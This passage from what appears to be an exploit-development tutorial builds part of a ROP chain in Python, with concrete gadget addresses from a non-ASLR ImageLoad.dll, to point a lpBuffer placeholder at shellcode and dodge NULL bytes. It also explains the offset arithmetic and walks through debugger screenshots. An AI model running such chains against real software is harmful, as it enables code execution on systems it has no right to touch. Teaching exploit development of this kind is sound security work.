crash += struct.pack('<L', 0x1001dacc)		# inc ecx ; clc ; mov edx, dword [ecx-0x04] ; ret: ImageLoad.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x1001dacc)		# inc ecx ; clc ; mov edx, dword [ecx-0x04] ; ret: ImageLoad.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x1001dacc)		# inc ecx ; clc ; mov edx, dword [ecx-0x04] ; ret: ImageLoad.dll (non-ASLR enabled module)
```
Two things about the above ROP gadgets. First, the `clc` instruction.

`clc` is an assembly instruction that clears the "carry" flag (the CF register). None of our ROP gadgets, now or later, depend on the state of this flag- so it is okay that this instruction resides in this gadget. Additionally, we have a `mov edx, dword [ecx-0x4]` instruction. Currently, we are not using the EDX register for anything- so this instruction will not consequently disrupt what we are trying to achieve.

Also notably, this set of ROP gadgets only increases ECX by 16 decimal bytes (0x10 hexadecimal)- even though the parameter placeholder for `lpBuffer` is located 0x18 bytes away (24 decimal bytes).

This is again a "preparatory" procedure for our future ROP gadgets. We need a gadget, similar to the following: `mov dword ptr [ecx], reg`, where `reg` refers to any register that contains the stack address of our shellcode and `dword ptr [ecx]` contains the stack address which is currently serving as the parameter placeholder for `lpBuffer`. This will essentially take what ECX is pointing to, which is `0x11111111`, and overwrite the pointer with the actual address of our shellcode.

However, there were no such gadgets that were found easily in the process memory. The closest gadget was `mov dword ptr [ecx+0x8], eax`. Knowing this, we will only raise ECX to 0x10 instead of 0x18- due to the gadget manipulating ECX's pointer at an offset of 0x8.

The key is now, to give some padding between the space on the stack for our future ROP gadgets and our shellcode. From here, we will provide approximately 0x300 of space on the stack for remaining ROP gadgets. This will allow us to choose a place on the stack that our shellcode will go, and start performing these calculations now. If perhaps we would need more thatn 0x300 bytes, due to more ROP gadgets needed than anticipated, we would move our shellcode down lower. We will "aim" for 0x300 bytes down the stack, and we will add NOPs to compensate for this. The following ROP gadgets can accomplish this.

```python
# Pointing EAX (shellcode location) to data inside of ECX (lpBuffer placeholder) (NOPs before shellcode)
crash += struct.pack('<L', 0x1001fce9)		# pop esi ; add esp + 0x8 ; ret: ImageLoad.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0xfffffd44)		# Shellcode is about negative 0xfffffd44 (0x2dc) bytes away from EAX
crash += struct.pack('<L', 0x90909090)		# Compensate for above ROP gadget
crash += struct.pack('<L', 0x90909090)		# Compensate for above ROP gadget
crash += struct.pack('<L', 0x10022f45)		# sub eax, esi ; pop edi ; pop esi ; ret
crash += struct.pack('<L', 0x90909090)		# Compensate for above ROP gadget
crash += struct.pack('<L', 0x90909090)		# Compensate for above ROP gadget
```

The location where our shellcode will be (your location can be different, depending on how far down the stack you wish to place it) is 0x2dc bytes away from the value in EAX. To load our shellcode value into EAX, we need to increase it by 0x2bc bytes. Obviously, this is too much to do for just consecutive `inc eax` gadgets. Additionally, if we directly added to EAX- the NULL byte problem would kill our exploit, because a 32-bit register like EAX needs the value 0x000002dc to fill its contents completely. Instead, we can use negative numbers and subtraction to yield the same result!

The negative representation of 0x2dc is loaded into ESI. We also need to compensate for the `add esp + 0x8` instruction, so we add 0x8 bytes of padding so no gadgets get "jumped over". Then, we subtract the value in ESI from EAX- and place the difference in EAX. This will result in the address of where our shellcode will go being placed into EAX. Additionally, we compensate for two `pop` gadgets.

Program execution reaches our ECX manipulating gadget(s).

<img src="{{ site.url }}{{ site.baseurl }}/images/WPM34a.png" alt="">

Stepping through the 16 gadgets, ECX is now 8 bytes behind the `lpBuffer` parameter- as expected.

<img src="{{ site.url }}{{ site.baseurl }}/images/WPM35.png" alt="">

Program execution then redirects to the EAX manipulation routine.

<img src="{{ site.url }}{{ site.baseurl }}/images/WPM37.png" alt="">

The intended negative value of 0x2dc is placed into ESI.

<img src="{{ site.url }}{{ site.baseurl }}/images/WPM38.png" alt="">

The value is then subtracted and the difference is placed in EAX! We have successfully loaded the address of where our shellcode will go, futher down the stack, into EAX.

<img src="{{ site.url }}{{ site.baseurl }}/images/WPM39.png" alt="">

<img src="{{ site.url }}{{ site.baseurl }}/images/WPM40.png" alt="">

> Note, the address where our shellcode will go is denoted with NOPs in the above image for visual effect- this was done in the debugger 

